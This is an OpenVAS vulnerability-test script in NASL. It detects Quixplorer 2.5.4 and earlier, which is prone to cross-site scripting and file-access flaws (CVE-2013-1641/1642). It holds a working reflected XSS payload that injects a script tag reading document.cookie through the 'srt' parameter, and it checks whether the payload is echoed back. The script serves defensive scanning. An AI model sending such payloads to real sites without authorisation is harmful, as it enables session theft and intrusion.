###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_quixplorer_mult_vuln_nov.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Quixplorer Multiple Vulnerabilities - Nov14
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804876");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-1641", "CVE-2013-1642");
  script_bugtraq_id(63964, 63962);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-04 17:05:21 +0530 (Tue, 04 Nov 2014)");
  script_name("Quixplorer Multiple Vulnerabilities - Nov14");

  script_tag(name:"summary", value:"This host is installed with Quixplorer
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as the input passed
  via the 'dir', 'item', 'order', 'searchitem', 'selitems[]', and 'srt'
  parameters is not validated upon submission to the
  /quixplorer/src/index.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to arbitrary files and execute arbitrary script code
  in a user's browser within the trust relationship between user's browser and
  the server.");

  script_tag(name:"affected", value:"Quixplorer version 2.5.4 and prior.");

  script_tag(name:"solution", value:"Upgrade to Quixplorer version 2.5.5 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://secunia.com/advisories/55725");
  script_xref(name:"URL", value:"https://www3.trustwave.com/spiderlabs/advisories/TWSL2013-030.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://github.com/realtimeprojects/quixplorer");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/quixplorer", "/filemanager", "/filemgr", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/src/index.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes && ">Login to use QuiXplorer<" >< rcvRes
            && rcvRes =~ "title.*QuiXplorer Version")
  {
    url = dir + '/src/index.php?action=list&dir=_config&order=n' +
                'ame&srt="><script>alert(document.cookie);</script>';

    ## Send and Confirm the Exploit
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"><script>alert\(document.cookie\);</script>",
       extra_check: "QuiXplorer<"))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);